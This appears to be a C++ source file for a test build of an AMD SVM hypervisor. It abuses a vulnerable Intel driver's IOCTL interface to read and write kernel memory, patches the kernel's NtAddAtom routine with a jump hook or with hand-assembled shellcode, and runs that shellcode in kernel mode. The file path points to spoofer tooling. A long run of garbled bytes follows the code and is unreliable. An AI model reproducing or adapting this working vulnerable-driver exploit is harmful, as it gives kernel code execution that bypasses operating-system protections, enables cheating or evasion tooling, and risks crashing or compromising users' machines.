ï¡// SVMHypervisorV5_7.cpp
// Step 5.7: FIRST VMRUN TEST
// Based on WORKING V5.6 + adds VMRUN
// Goal: Guest executes CPUID -> immediate VMEXIT -> verify exit code 0x72

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

typedef LONG NTSTATUS;
#define NTAPI __stdcall

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#define IOCTL_INTEL_COPY 0x80862007

typedef struct _COPY_MEMORY_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t source;
  uint64_t destination;
  uint64_t length;
} COPY_MEMORY_BUFFER_INFO;

typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_physical_address;
  uint64_t address_to_translate;
} GET_PHYS_ADDRESS_BUFFER_INFO;

typedef struct _MAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_value;
  uint64_t return_virtual_address;
  uint64_t physical_address_to_map;
  uint32_t size;
} MAP_IO_SPACE_BUFFER_INFO;

typedef struct _UNMAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t reserved2;
  uint64_t virt_address;
  uint64_t reserved3;
  uint32_t number_of_bytes;
} UNMAP_IO_SPACE_BUFFER_INFO;

extern "C" {
NTSTATUS NTAPI NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
}

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
  ULONG NumberOfModules;
  RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

HANDLE hDevice = INVALID_HANDLE_VALUE;
uint64_t ntoskrnlBase = 0;
uint64_t kernelNtAddAtom = 0;

bool MemCopy(uint64_t dest, uint64_t src, uint64_t size) {
  COPY_MEMORY_BUFFER_INFO info = {0};
  info.case_number = 0x33;
  info.source = src;
  info.destination = dest;
  info.length = size;
  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool ReadMemory(uint64_t address, void *buffer, uint64_t size) {
  if (size > 0x1000)
    size = 0x1000;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  VirtualLock(pinnedBuffer, 0x1000);
  bool result = MemCopy((uint64_t)pinnedBuffer, address, size);
  if (result)
    memcpy(buffer, pinnedBuffer, size);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool WriteMemory(uint64_t address, void *buffer, uint64_t size) {
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);
  bool result = MemCopy(address, (uint64_t)pinnedBuffer, size);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool GetPhysicalAddress(uint64_t address, uint64_t *outPhys) {
  GET_PHYS_ADDRESS_BUFFER_INFO info = {0};
  info.case_number = 0x25;
  info.address_to_translate = address;
  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return false;
  *outPhys = info.return_physical_address;
  return true;
}

uint64_t MapIoSpace(uint64_t physAddr, uint32_t size) {
  MAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x19;
  info.physical_address_to_map = physAddr;
  info.size = size;
  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return 0;
  return info.return_virtual_address;
}

bool UnmapIoSpace(uint64_t virtAddr, uint32_t size) {
  UNMAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x1A;
  info.virt_address = virtAddr;
  info.number_of_bytes = size;
  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool WriteToReadOnlyMemory(uint64_t address, void *buffer, uint32_t size) {
  uint64_t physAddr = 0;
  if (!GetPhysicalAddress(address, &physAddr) || physAddr == 0)
    return false;
  uint64_t mappedAddr = MapIoSpace(physAddr, size);
  if (!mappedAddr)
    return false;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer) {
    UnmapIoSpace(mappedAddr, size);
    return false;
  }
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);
  bool result = MemCopy(mappedAddr, (uint64_t)pinnedBuffer, size);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  UnmapIoSpace(mappedAddr, size);
  return result;
}

uint64_t GetKernelModuleBase(const char *moduleName,
                             uint32_t *outSize = nullptr) {
  ULONG size = 0;
  NtQuerySystemInformation(11, nullptr, 0, &size);
  PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)malloc(size);
  if (!modules)
    return 0;
  if (NtQuerySystemInformation(11, modules, size, &size) != 0) {
    free(modules);
    return 0;
  }
  uint64_t base = 0;
  for (ULONG i = 0; i < modules->NumberOfModules; i++) {
    char *name = (char *)modules->Modules[i].FullPathName +
                 modules->Modules[i].OffsetToFileName;
    if (_stricmp(name, moduleName) == 0) {
      base = (uint64_t)modules->Modules[i].ImageBase;
      if (outSize)
        *outSize = modules->Modules[i].ImageSize;
      break;
    }
  }
  free(modules);
  return base;
}

uint64_t GetKernelExport(uint64_t moduleBase, const char *exportName) {
  IMAGE_DOS_HEADER dosHeader;
  IMAGE_NT_HEADERS64 ntHeaders;
  if (!ReadMemory(moduleBase, &dosHeader, sizeof(dosHeader)))
    return 0;
  if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    return 0;
  if (!ReadMemory(moduleBase + dosHeader.e_lfanew, &ntHeaders,
                  sizeof(ntHeaders)))
    return 0;
  if (ntHeaders.Signature != IMAGE_NT_SIGNATURE)
    return 0;
  uint32_t exportRva =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
  uint32_t exportSize =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
  if (!exportRva || !exportSize)
    return 0;
  uint32_t readSize = (exportSize < 0x40000) ? exportSize : 0x40000;
  BYTE *exportData = (BYTE *)VirtualAlloc(
      nullptr, readSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!exportData)
    return 0;
  for (uint32_t offset = 0; offset < readSize; offset += 0x1000) {
    uint32_t chunkSize =
        ((readSize - offset) < 0x1000) ? (readSize - offset) : 0x1000;
    ReadMemory(moduleBase + exportRva + offset, exportData + offset, chunkSize);
  }
  IMAGE_EXPORT_DIRECTORY *exportDir = (IMAGE_EXPORT_DIRECTORY *)exportData;
  uint64_t delta = (uint64_t)exportData - exportRva;
  if (exportDir->AddressOfNames < exportRva ||
      exportDir->AddressOfNames >= exportRva + readSize) {
    VirtualFree(exportData, 0, MEM_RELEASE);
    return 0;
  }
  uint32_t *nameTable = (uint32_t *)(exportDir->AddressOfNames + delta);
  uint16_t *ordinalTable =
      (uint16_t *)(exportDir->AddressOfNameOrdinals + delta);
  uint32_t *funcTable = (uint32_t *)(exportDir->AddressOfFunctions + delta);
  uint64_t result = 0;
  for (uint32_t i = 0; i < exportDir->NumberOfNames && i < 10000; i++) {
    uint32_t nameRva = nameTable[i];
    if (nameRva < exportRva || nameRva >= exportRva + readSize)
      continue;
    char *funcName = (char *)(nameRva + delta);
    if (strcmp(funcName, exportName) == 0) {
      result = moduleBase + funcTable[ordinalTable[i]];
      break;
    }
  }
  VirtualFree(exportData, 0, MEM_RELEASE);
  return result;
}

uint8_t kernel_injected_jmp[] = {0x48, 0xb8, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0};
uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];

template <typename RetType, typename... Args>
bool CallKernelFunction(RetType *outResult, uint64_t targetFuncAddr,
                        Args... args) {
  if (!targetFuncAddr || !kernelNtAddAtom)
    return false;
  if (!ReadMemory(kernelNtAddAtom, original_kernel_function,
                  sizeof(original_kernel_function)))
    return false;
  if (original_kernel_function[0] == 0x48 &&
      original_kernel_function[1] == 0xb8)
    return false;
  uint8_t jmpHook[sizeof(kernel_injected_jmp)];
  memcpy(jmpHook, kernel_injected_jmp, sizeof(jmpHook));
  *(uint64_t *)&jmpHook[2] = targetFuncAddr;
  if (!WriteToReadOnlyMemory(kernelNtAddAtom, jmpHook, sizeof(jmpHook)))
    return false;
  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  auto NtAddAtomPtr = reinterpret_cast<RetType(__stdcall *)(Args...)>(
      GetProcAddress(ntdll, "NtAddAtom"));
  RetType result = NtAddAtomPtr(args...);
  WriteToReadOnlyMemory(kernelNtAddAtom, original_kernel_function,
                        sizeof(original_kernel_function));
  if (outResult)
    *outResult = result;
  return true;
}

// ==================== V5.7 Shellcode ====================
// Based on WORKING V5.6 + adds:
// - Set ASID = 1
// - Set CPUID intercept
// - Set VMRUN intercept (required!)
// - Guest RIP = address of CPUID instruction (embedded in shellcode)
// - Guest RAX = VMCB_PA (for post-VMEXIT vmsave)
// - CLI before VMRUN
// - VMLOAD + VMRUN
// - After VMEXIT: VMSAVE + STGI + STI

uint8_t v5_7Shellcode[] = {
    // ===== Prologue =====
    0x55, // push rbp           ; byte 0
    0x48,
    0x89,
    0xE5, // mov rbp, rsp       ; bytes 1-3
    0x50, // push rax           ; byte 4
    0x51, // push rcx           ; byte 5
    0x52, // push rdx           ; byte 6
    0x53, // push rbx           ; byte 7
    // Total: 8 bytes (0-7)

    // ===== Step 1: Enable EFER.SVME =====
    0xB9,
    0x80,
    0x00,
    0x00,
    0xC0, // mov ecx, 0xC0000080 ; bytes 8-12
    0x0F,
    0x32, // rdmsr               ; bytes 13-14
    0x0D,
    0x00,
    0x10,
    0x00,
    0x00, // or eax, 0x1000      ; bytes 15-19
    0x0F,
    0x30, // wrmsr               ; bytes 20-21
    // Total: 22 bytes

    // ===== Step 2: Write VM_HSAVE_PA MSR =====
    0xB9,
    0x17,
    0x01,
    0x01,
    0xC0, // mov ecx, 0xC0010117 ; bytes 22-26
    0xB8,
    0x00,
    0x00,
    0x00,
    0x00, // mov eax, low  @28   ; bytes 27-31
    0xBA,
    0x00,
    0x00,
    0x00,
    0x00, // mov edx, high @33   ; bytes 32-36
    0x0F,
    0x30, // wrmsr               ; bytes 37-38
    // Total: 39 bytes

    // ===== Step 3: Load VMCB_PA into RAX =====
    0x48,
    0xB8,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov rax, vmcb_pa @41 ; bytes 39-48
    // Total: 49 bytes

    // ===== Step 4: VMSAVE to capture hidden state =====
    0x0F,
    0x01,
    0xDB, // vmsave rax          ; bytes 49-51
    // Total: 52 bytes

    // ===== Step 5: Load VMCB_VA into RBX =====
    0x48,
    0xBB,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov rbx, vmcb_va @54 ; bytes 52-61
    // Total: 62 bytes

    // ===== Step 6-16: Same as V5.6 (CR0, CR3, CR4, EFER, GDTR, IDTR, segments,
    // RFLAGS, RSP) =====
    // Step 6: CR0
    0x0F,
    0x20,
    0xC0, // mov rax, cr0
    0x48,
    0x89,
    0x83,
    0x58,
    0x05,
    0x00,
    0x00, // mov [rbx+0x558], rax
    // Step 7: CR3
    0x0F,
    0x20,
    0xD8, // mov rax, cr3
    0x48,
    0x89,
    0x83,
    0x50,
    0x05,
    0x00,
    0x00, // mov [rbx+0x550], rax
    // Step 8: CR4
    0x0F,
    0x20,
    0xE0, // mov rax, cr4
    0x48,
    0x89,
    0x83,
    0x48,
    0x05,
    0x00,
    0x00, // mov [rbx+0x548], rax
    // Step 9: EFER
    0xB9,
    0x80,
    0x00,
    0x00,
    0xC0, // mov ecx, 0xC0000080
    0x0F,
    0x32, // rdmsr
    0x48,
    0xC1,
    0xE2,
    0x20, // shl rdx, 32
    0x48,
    0x09,
    0xD0, // or rax, rdx
    0x48,
    0x89,
    0x83,
    0xD0,
    0x04,
    0x00,
    0x00, // mov [rbx+0x4D0], rax
    // Step 10: GDTR
    0x48,
    0x83,
    0xEC,
    0x10, // sub rsp, 16
    0x0F,
    0x01,
    0x04,
    0x24, // sgdt [rsp]
    0x0F,
    0xB7,
    0x04,
    0x24, // movzx eax, word [rsp]
    0x89,
    0x83,
    0x64,
    0x04,
    0x00,
    0x00, // mov [rbx+0x464], eax
    0x48,
    0x8B,
    0x44,
    0x24,
    0x02, // mov rax, [rsp+2]
    0x48,
    0x89,
    0x83,
    0x68,
    0x04,
    0x00,
    0x00, // mov [rbx+0x468], rax
    // Step 11: IDTR
    0x0F,
    0x01,
    0x0C,
    0x24, // sidt [rsp]
    0x0F,
    0xB7,
    0x04,
    0x24, // movzx eax, word [rsp]
    0x89,
    0x83,
    0x84,
    0x04,
    0x00,
    0x00, // mov [rbx+0x484], eax
    0x48,
    0x8B,
    0x44,
    0x24,
    0x02, // mov rax, [rsp+2]
    0x48,
    0x89,
    0x83,
    0x88,
    0x04,
    0x00,
    0x00, // mov [rbx+0x488], rax
    0x48,
    0x83,
    0xC4,
    0x10, // add rsp, 16
    // Step 12: Segment selectors
    0x8C,
    0xC8, // mov ax, cs
    0x66,
    0x89,
    0x83,
    0x10,
    0x04,
    0x00,
    0x00, // mov [rbx+0x410], ax
    0x8C,
    0xD0, // mov ax, ss
    0x66,
    0x89,
    0x83,
    0x20,
    0x04,
    0x00,
    0x00, // mov [rbx+0x420], ax
    0x8C,
    0xD8, // mov ax, ds
    0x66,
    0x89,
    0x83,
    0x30,
    0x04,
    0x00,
    0x00, // mov [rbx+0x430], ax
    0x8C,
    0xC0, // mov ax, es
    0x66,
    0x89,
    0x83,
    0x00,
    0x04,
    0x00,
    0x00, // mov [rbx+0x400], ax
    // Step 13: Segment limits (0xFFFFFFFF)
    0xB8,
    0xFF,
    0xFF,
    0xFF,
    0xFF, // mov eax, 0xFFFFFFFF
    0x89,
    0x83,
    0x04,
    0x04,
    0x00,
    0x00, // mov [rbx+0x404], eax
    0x89,
    0x83,
    0x14,
    0x04,
    0x00,
    0x00, // mov [rbx+0x414], eax
    0x89,
    0x83,
    0x24,
    0x04,
    0x00,
    0x00, // mov [rbx+0x424], eax
    0x89,
    0x83,
    0x34,
    0x04,
    0x00,
    0x00, // mov [rbx+0x434], eax
    // Step 14: Segment attributes
    0x66,
    0xC7,
    0x83,
    0x12,
    0x04,
    0x00,
    0x00,
    0x9B,
    0x02, // CS = 0x029B
    0x66,
    0xC7,
    0x83,
    0x22,
    0x04,
    0x00,
    0x00,
    0x93,
    0x00, // SS = 0x0093
    0x66,
    0xC7,
    0x83,
    0x32,
    0x04,
    0x00,
    0x00,
    0x93,
    0x00, // DS = 0x0093
    0x66,
    0xC7,
    0x83,
    0x02,
    0x04,
    0x00,
    0x00,
    0x93,
    0x00, // ES = 0x0093
    // Step 15: RFLAGS
    0x9C, // pushfq
    0x58, // pop rax
    0x48,
    0x89,
    0x83,
    0x70,
    0x05,
    0x00,
    0x00, // mov [rbx+0x570], rax
    // Step 16: RSP
    0x48,
    0x89,
    0xE0, // mov rax, rsp
    0x48,
    0x89,
    0x83,
    0xD8,
    0x05,
    0x00,
    0x00, // mov [rbx+0x5D8], rax

    // ===== NEW for V5.7: Set ASID = 1 =====
    0xC7,
    0x43,
    0x58,
    0x01,
    0x00,
    0x00,
    0x00, // mov dword [rbx+0x58], 1

    // ===== NEW for V5.7: Set intercepts (CPUID + VMRUN) =====
    0xC7,
    0x43,
    0x0C,
    0x00,
    0x00,
    0x04,
    0x00, // mov dword [rbx+0x0C], 0x40000 (CPUID bit)
    0xC7,
    0x43,
    0x10,
    0x01,
    0x00,
    0x00,
    0x00, // mov dword [rbx+0x10], 1 (VMRUN)

    // ===== NEW for V5.7: Set guest RIP = address of CPUID at end of shellcode
    // =====
    // We use LEA to calculate the address
    0x48,
    0x8D,
    0x05,
    0x00,
    0x00,
    0x00,
    0x00, // lea rax, [rip+XX] @PATCH_LEA
    0x48,
    0x89,
    0x83,
    0x78,
    0x05,
    0x00,
    0x00, // mov [rbx+0x578], rax (guest RIP)

    // ===== NEW for V5.7: Set guest RAX = VMCB_PA for post-VMEXIT vmsave =====
    0x48,
    0xB8,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov rax, vmcb_pa @PATCH_RAX
    0x48,
    0x89,
    0x83,
    0xF8,
    0x05,
    0x00,
    0x00, // mov [rbx+0x5F8], rax (guest RAX)

    // ===== VMRUN sequence =====
    0xFA, // cli
    0x0F,
    0x01,
    0xDA, // vmload rax
    0x0F,
    0x01,
    0xD8, // vmrun rax
    // =========== VMEXIT returns here ===========

    // ===== Post-VMEXIT =====
    0x0F,
    0x01,
    0xDB, // vmsave rax
    0x0F,
    0x01,
    0xDC, // stgi
    0xFB, // sti

    // ===== Epilogue =====
    0x48,
    0x31,
    0xC0, // xor rax, rax
    0x5B, // pop rbx
    0x5A, // pop rdx
    0x59, // pop rcx
    0x48,
    0x83,
    0xC4,
    0x08, // add rsp, 8
    0x5D, // pop rbp
    0xC3, // ret

    // ===== CPUID instruction (guest will execute this) =====
    0x0F,
    0xA2, // cpuid @CPUID_LOCATION
};

// We need to calculate these offsets carefully
void PrintOffsets() {
  printf("[*] Calculating shellcode offsets...\n");

  // Find HSAVE patches (B8 followed by BA)
  for (size_t i = 0; i < sizeof(v5_7Shellcode) - 10; i++) {
    if (v5_7Shellcode[i] == 0xB8 && v5_7Shellcode[i + 5] == 0xBA) {
      printf("    HSAVE_LOW: %zu, HSAVE_HIGH: %zu\n", i + 1, i + 6);
      break;
    }
  }

  // Find first mov rax, imm64 (48 B8) - VMCB_PA
  int count = 0;
  for (size_t i = 0; i < sizeof(v5_7Shellcode) - 10; i++) {
    if (v5_7Shellcode[i] == 0x48 && v5_7Shellcode[i + 1] == 0xB8) {
      count++;
      if (count == 1)
        printf("    VMCB_PA: %zu\n", i + 2);
      if (count == 2)
        printf("    GUEST_RAX: %zu\n", i + 2);
    }
  }

  // Find mov rbx, imm64 (48 BB) - VMCB_VA
  for (size_t i = 0; i < sizeof(v5_7Shellcode) - 10; i++) {
    if (v5_7Shellcode[i] == 0x48 && v5_7Shellcode[i + 1] == 0xBB) {
      printf("    VMCB_VA: %zu\n", i + 2);
      break;
    }
  }

  // Find LEA (48 8D 05)
  for (size_t i = 0; i < sizeof(v5_7Shellcode) - 10; i++) {
    if (v5_7Shellcode[i] == 0x48 && v5_7Shellcode[i + 1] == 0x8D &&
        v5_7Shellcode[i + 2] == 0x05) {
      printf("    LEA_DISP: %zu\n", i + 3);
      break;
    }
  }

  // Find CPUID (0F A2) - it's at the very end of the shellcode
  size_t cpuidLoc = sizeof(v5_7Shellcode) - 2; // CPUID is last 2 bytes
  if (v5_7Shellcode[cpuidLoc] == 0x0F && v5_7Shellcode[cpuidLoc + 1] == 0xA2) {
    printf("    CPUID location: %zu\n", cpuidLoc);
  } else {
    printf("    CPUID location: NOT FOUND (expected at %zu)!\n", cpuidLoc);
  }

  printf("    Total shellcode: %zu bytes\n", sizeof(v5_7Shellcode));
}

int main() {
  printf("================================================================\n");
  printf("       SVM HYPERVISOR V5.7 - FIRST VMRUN TEST!                 \n");
  printf("    Guest executes CPUID -> immediate VMEXIT (code 0x72)       \n");
  printf(
      "================================================================\n\n");

  PrintOffsets();

  hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                        OPEN_EXISTING, 0, nullptr);
  if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[-] Intel driver not running!\n");
    return 1;
  }
  printf("[+] Intel driver opened\n");

  ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
  kernelNtAddAtom = GetKernelExport(ntoskrnlBase, "NtAddAtom");
  uint64_t kernelExAllocatePool =
      GetKernelExport(ntoskrnlBase, "ExAllocatePoolWithTag");

  // Allocate memory
  uint64_t allocatedAddr = 0;
  CallKernelFunction<uint64_t>(&allocatedAddr, kernelExAllocatePool, 0, 0x2000,
                               0x484D5653);
  if (!allocatedAddr) {
    printf("[-] Allocation failed!\n");
    return 1;
  }

  uint64_t vmcbVa = allocatedAddr;
  uint64_t hsaveVa = allocatedAddr + 0x1000;
  uint64_t vmcbPa = 0, hsavePa = 0;
  GetPhysicalAddress(vmcbVa, &vmcbPa);
  GetPhysicalAddress(hsaveVa, &hsavePa);
  printf("[+] VMCB VA: 0x%llX PA: 0x%llX\n", vmcbVa, vmcbPa);
  printf("[+] HSAVE VA: 0x%llX PA: 0x%llX\n", hsaveVa, hsavePa);

  // Zero memory
  uint8_t zeros[0x1000] = {0};
  WriteMemory(vmcbVa, zeros, 0x1000);
  WriteMemory(hsaveVa, zeros, 0x1000);

  // Calculate offsets dynamically
  size_t OFF_HSAVE_LOW = 0, OFF_HSAVE_HIGH = 0, OFF_VMCB_PA = 0,
         OFF_VMCB_VA = 0;
  size_t OFF_LEA_DISP = 0, OFF_GUEST_RAX = 0, LOC_CPUID = 0;

  for (size_t i = 0; i < sizeof(v5_7Shellcode) - 10; i++) {
    if (v5_7Shellcode[i] == 0xB8 && v5_7Shellcode[i + 5] == 0xBA &&
        OFF_HSAVE_LOW == 0) {
      OFF_HSAVE_LOW = i + 1;
      OFF_HSAVE_HIGH = i + 6;
    }
  }

  int count = 0;
  for (size_t i = 0; i < sizeof(v5_7Shellcode) - 10; i++) {
    if (v5_7Shellcode[i] == 0x48 && v5_7Shellcode[i + 1] == 0xB8) {
      count++;
      if (count == 1)
        OFF_VMCB_PA = i + 2;
      if (count == 2)
        OFF_GUEST_RAX = i + 2;
    }
  }

  for (size_t i = 0; i < sizeof(v5_7Shellcode) - 10; i++) {
    if (v5_7Shellcode[i] == 0x48 && v5_7Shellcode[i + 1] == 0xBB) {
      OFF_VMCB_VA = i + 2;
      break;
    }
  }

  for (size_t i = 0; i < sizeof(v5_7Shellcode) - 10; i++) {
    if (v5_7Shellcode[i] == 0x48 && v5_7Shellcode[i + 1] == 0x8D &&
        v5_7Shellcode[i + 2] == 0x05) {
      OFF_LEA_DISP = i + 3;
      break;
    }
  }

  // CPUID is at the very last 2 bytes of the shellcode
  LOC_CPUID = sizeof(v5_7Shellcode) - 2;
  if (v5_7Shellcode[LOC_CPUID] != 0x0F ||
      v5_7Shellcode[LOC_CPUID + 1] != 0xA2) {
    printf("[-] ERROR: CPUID not at expected location %zu!\n", LOC_CPUID);
    return 1;
  }

  printf("[+] Calculated offsets:\n");
  printf("    HSAVE_LOW=%zu, HSAVE_HIGH=%zu\n", OFF_HSAVE_LOW, OFF_HSAVE_HIGH);
  printf("    VMCB_PA=%zu, VMCB_VA=%zu\n", OFF_VMCB_PA, OFF_VMCB_VA);
  printf("    GUEST_RAX=%zu, LEA_DISP=%zu, CPUID=%zu\n", OFF_GUEST_RAX,
         OFF_LEA_DISP, LOC_CPUID);

  // Patch shellcode
  uint8_t patched[sizeof(v5_7Shellcode)];
  memcpy(patched, v5_7Shellcode, sizeof(patched));

  *(uint32_t *)&patched[OFF_HSAVE_LOW] = (uint32_t)(hsavePa & 0xFFFFFFFF);
  *(uint32_t *)&patched[OFF_HSAVE_HIGH] =
      (uint32_t)((hsavePa >> 32) & 0xFFFFFFFF);
  *(uint64_t *)&patched[OFF_VMCB_PA] = vmcbPa;
  *(uint64_t *)&patched[OFF_VMCB_VA] = vmcbVa;
  *(uint64_t *)&patched[OFF_GUEST_RAX] = vmcbPa;

  // Calculate LEA displacement to CPUID
  // LEA ends at OFF_LEA_DISP + 4, CPUID is at LOC_CPUID
  int32_t leaDisp = (int32_t)(LOC_CPUID - (OFF_LEA_DISP + 4));
  *(int32_t *)&patched[OFF_LEA_DISP] = leaDisp;

  printf("[+] LEA displacement: %d\n", leaDisp);
  printf("[+] Shellcode patched (%zu bytes)\n\n", sizeof(patched));

  printf("Press ENTER to execute VMRUN...\n");
  getchar();

  // Execute
  uint8_t backup[512];
  ReadMemory(kernelNtAddAtom, backup, sizeof(patched));
  WriteToReadOnlyMemory(kernelNtAddAtom, patched, sizeof(patched));

  printf("[*] Executing V5.7 VMRUN...\n");
  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  auto NtAddAtomFunc = (NTSTATUS(__stdcall *)(
      void *, ULONG, PUSHORT))GetProcAddress(ntdll, "NtAddAtom");
  USHORT atom = 0;
  NTSTATUS result = NtAddAtomFunc(nullptr, 0, &atom);

  WriteToReadOnlyMemory(kernelNtAddAtom, backup, sizeof(patched));
  printf("[+] NtAddAtom restored\n\n");

  // Read VMEXIT code
  uint8_t vmcbContent[0x1000];
  ReadMemory(vmcbVa, vmcbContent, sizeof(vmcbContent));
  uint64_t exitCode = *(uint64_t *)&vmcbContent[0x70];

  printf("=== VMEXIT Result ===\n");
  printf("[*] VMEXIT code: 0x%llX\n", exitCode);

  if (exitCode == 0x72) {
    printf("\n");
    printf("========================================\n");
    printf("  [+] SUCCESS! VMEXIT = 0x72 (CPUID)  \n");
    printf("  [+] HYPERVISOR IS WORKING!!!        \n");
    printf("========================================\n");
  } else if (exitCode == (uint64_t)-1) {
    printf("[-] VMEXIT_INVALID - VMCB check failed\n");
  } else {
    printf("[*] Got VMEXIT code 0x%llX\n", exitCode);
  }

  CloseHandle(hDevice);
  return 0;
}
èì *cascade08èìôì*cascade08ôìöì *cascade08öì¶ì*cascade08¶ìßì *cascade08ßì®ì*cascade08®ì©ì *cascade08©ì¥ì*cascade08¥ìµì *cascade08µì∫ì*cascade08∫ì¬ì *cascade08¬ì≈ì*cascade08≈ì∆ì *cascade08∆ì ì*cascade08 ìÂì *cascade08ÂìÊì*cascade08ÊìÁì *cascade08Áìì*cascade08ìÚì *cascade08ÚìÛì*cascade08ÛìÙì *cascade08Ùì¯ì*cascade08¯ì˘ì *cascade08˘ì˙ì*cascade08˙ì˚ì *cascade08˚ìÄî*cascade08Äîñî *cascade08ñîôî*cascade08ôîöî *cascade08öîûî*cascade08ûîπî *cascade08πîºî*cascade08ºîΩî *cascade08Ωî¡î*cascade08¡î˚î *cascade08˚î˛î*cascade08˛îˇî *cascade08ˇîÉï*cascade08Éïâï *cascade08âïäï*cascade08äïãï *cascade08ãïèï*cascade08èïêï *cascade08êïìï*cascade08ìïïï *cascade08ïïòï*cascade08òïôï *cascade08ôï¨ï*cascade08¨ï≠ï *cascade08≠ï≤ï*cascade08≤ï≥ï *cascade08≥ï∂ï*cascade08∂ï∑ï *cascade08∑ïºï*cascade08ºïΩï *cascade08Ωï∆ï*cascade08∆ï«ï *cascade08«ïﬁï*cascade08ﬁï„´ *cascade08„´¯´*cascade08¯´˘´ *cascade08˘´˙´*cascade08˙´˚´ *cascade08˚´˝´*cascade08˝´˛´ *cascade08˛´Ö¨*cascade08Ö¨Ü¨ *cascade08Ü¨ã¨*cascade08ã¨å¨ *cascade08å¨é¨*cascade08é¨è¨ *cascade08è¨•¨*cascade08•¨¿¨ *cascade08¿¨¡¨*cascade08¡¨ÿ¨ *cascade08ÿ¨·¨*cascade08·¨„¨ *cascade08„¨‰¨*cascade08‰¨Î¨ *cascade08Î¨Ù¨*cascade08Ù¨É≠ *cascade08É≠å≠*cascade08å≠í≠ *cascade08í≠ì≠*cascade08ì≠¢≠ *cascade08¢≠≠≠*cascade08≠≠Æ≠ *cascade08Æ≠‹≠*cascade08‹≠Ê≠ *cascade08Ê≠Á≠*cascade08Á≠≠ *cascade08≠Ù≠*cascade08Ù≠ı≠ *cascade08ı≠˜≠*cascade08˜≠ï¡ *cascade0820file:///C:/inject/Spoofers/SVMHypervisorV5_7.cpp